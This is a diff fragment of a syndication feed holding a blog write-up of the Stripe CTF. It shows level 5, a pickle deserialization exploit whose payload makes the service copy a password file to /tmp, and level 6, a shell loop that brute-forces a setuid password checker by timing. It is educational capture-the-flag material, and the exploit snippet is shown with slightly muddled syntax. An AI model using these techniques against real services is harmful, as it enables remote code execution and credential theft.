-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9020&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;banana&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
-&lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;quot;processing_time&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;5.0037501611238511e-06&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;quot;queue_time&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.4377421910476061&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;quot;result&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;BANANA&amp;quot;&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl localhost:9020 -d &lt;span class="s1"&gt;&amp;#39;banana&amp;#39;&lt;/span&gt;
+&lt;span class="o"&gt;{&lt;/span&gt;
+    &lt;span class="s2"&gt;&amp;quot;processing_time&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;5&lt;/span&gt;.0037501611238511e-06,
+    &lt;span class="s2"&gt;&amp;quot;queue_time&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;0&lt;/span&gt;.4377421910476061,
+    &lt;span class="s2"&gt;&amp;quot;result&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;BANANA&amp;quot;&lt;/span&gt;
+&lt;span class="o"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;After inspecting the code, we concentrate in the suspicious &lt;strong&gt;deserialize&lt;/strong&gt; function that contains the unsafe module &lt;a href="https://docs.python.org/2/library/pickle.html"&gt;pickle&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;deserialize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serialized&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;logger&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Deserializing: &lt;/span&gt;&lt;span class="si"&gt;%r&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;serialized&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;^type: (.*?); data: (.*?); job: (.*?)$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DOTALL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;deserialize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serialized&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;logger&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Deserializing: &lt;/span&gt;&lt;span class="si"&gt;%r&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;serialized&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;^type: (.*?); data: (.*?); job: (.*?)$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DOTALL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;match&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serialized&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;direction&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
@@ -429,10 +430,10 @@ chmod +x date
 
 
 &lt;p&gt;This is used later in the &lt;strong&gt;serialize&lt;/strong&gt; function:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nd"&gt;@staticmethod&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@staticmethod&lt;/span&gt;
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;serialize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;direction&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;job&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;serialized&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&amp;quot;type: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;; data: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;; job: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;direction&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dumps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;job&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-    &lt;span class="n"&gt;logger&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Serialized to: &lt;/span&gt;&lt;span class="si"&gt;%r&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;serialized&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;serialized&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;type: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;; data: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;; job: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;direction&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dumps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;job&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;logger&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Serialized to: &lt;/span&gt;&lt;span class="si"&gt;%r&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;serialized&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;serialized&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -440,22 +441,22 @@ chmod +x date
 &lt;p&gt;So, the program serializes jobs with pickle, and  sends them to a series of workers to deserialize and process the job. Once again, the attack surface is in the user input, which is not properly sanitized: this function allows arbitrary data to  be sent to &lt;strong&gt;; job&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;We can exploit it by making the serialization code execute arbitrary commands by supplying a string such as &lt;strong&gt;; job: &lt;pickled&gt;&lt;/strong&gt;. This will run some Python code that will give us the password  when unpickled. A great module for this task is &lt;a href="https://docs.python.org/2/library/os.html#os.system"&gt;Python's os.system&lt;/a&gt;, which executes  commands in a subshell.&lt;/p&gt;
 &lt;p&gt;An example of  exploit in Python is the follwing:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
-&lt;span class="n"&gt;HOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;localhost:9020&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
+&lt;span class="n"&gt;HOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;localhost:9020&amp;#39;&lt;/span&gt;
 
-&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/usr/bin/curl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;-d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; \
-    &lt;span class="s"&gt;&amp;quot;bla; job: cos&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;system&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;(S&amp;#39;cat /home/level05/.password &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
-&lt;span class="s"&gt;    &amp;gt; /tmp/pass&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;tR.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;{})&lt;/span&gt;
+&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/curl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; \
+    &lt;span class="s2"&gt;&amp;quot;bla; job: cos&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;system&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;(S&amp;#39;cat /home/level05/.password &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="s2"&gt;    &amp;gt; /tmp/pass&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;tR.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;{})&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Level 6: Timing Attack&lt;/h2&gt;
 &lt;p&gt;And we have reached the sixth level!&lt;/p&gt;
 &lt;p&gt;The goal in this level is to read the password from &lt;em&gt;/home/the-flag/.password&lt;/em&gt;. To complete this  challenge, another &lt;strong&gt;setuid&lt;/strong&gt; binary  is given, which can be used to guess the password:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;level06&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="n"&gt;banana&lt;/span&gt;
- &lt;span class="n"&gt;Welcome&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="n"&gt;checker&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
-&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;Ha&lt;/span&gt; &lt;span class="n"&gt;ha&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;incorrect&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./level06 /home/the-flag/.password banana
+ Welcome to the password checker!
+$ Ha ha, your password is incorrect!
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -467,20 +468,20 @@ chmod +x date
 2
 3
 4
-5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mf"&gt;0..9&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
-&lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
-&lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c35&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;sleep&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;
-&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;levels&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;level06&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$c&amp;quot;&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;
-&lt;span class="n"&gt;done&lt;/span&gt;
+5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;for c in {A..Z} {a..z} {0..9}; do
+echo $c
+head -c35 file &amp;amp; sleep 0.1
+/levels/level06 /home/the-flag/.password &amp;quot;$c&amp;quot;A 2&amp;gt; file
+done
 &lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 
 &lt;p&gt;&lt;strong&gt;And we get our flag! This was really fun! :) &lt;/strong&gt;&lt;/p&gt;
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;References&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="https://stripe.com/blog/capture-the-flag-wrap-up"&gt;Andy Brody's Post&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://github.com/stripe-ctf"&gt;Stripe CTF Repository&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Pickle Modules is unsafe! &lt;a href="https://blog.nelhage.com/2011/03/exploiting-pickle/"&gt;Here&lt;/a&gt; and &lt;a href="http://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/"&gt;here&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Some other writeups: &lt;a href="http://blog.delroth.net/2012/03/my-stripe-ctf-writeup/"&gt;here&lt;/a&gt;, &lt;a href="https://khr0x40sh.wordpress.com/2012/02/"&gt;here&lt;/a&gt;, &lt;a href="http://du.nham.ca/blog/posts/2012/03/20/stripe-ctf/"&gt;here&lt;/a&gt;, and &lt;a href="https://isisblogs.poly.edu/2012/03/23/stripe-ctf-level01/"&gt;here&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;</summary><category term="SQLi"></category><category term="PHP"></category><category term="Wargames"></category><category term="CTF"></category><category term="Burp"></category><category term="curl"></category><category term="assembly"></category><category term="shellcode"></category><category term="gdb"></category><category term="C"></category><category term="objdump"></category><category term="Timing_attack"></category><category term="Buffer_overflow"></category><category term="Stack_overflow"></category><category term="Python"></category><category term="Stripe"></category></entry></feed>
+&lt;/ul&gt;</content><category term="SQLi"></category><category term="PHP"></category><category term="Wargames"></category><category term="CTF"></category><category term="Burp"></category><category term="curl"></category><category term="assembly"></category><category term="shellcode"></category><category term="gdb"></category><category term="C"></category><category term="objdump"></category><category term="Timing_attack"></category><category term="Buffer_overflow"></category><category term="Stack_overflow"></category><category term="Python"></category><category term="Stripe"></category></entry></feed>
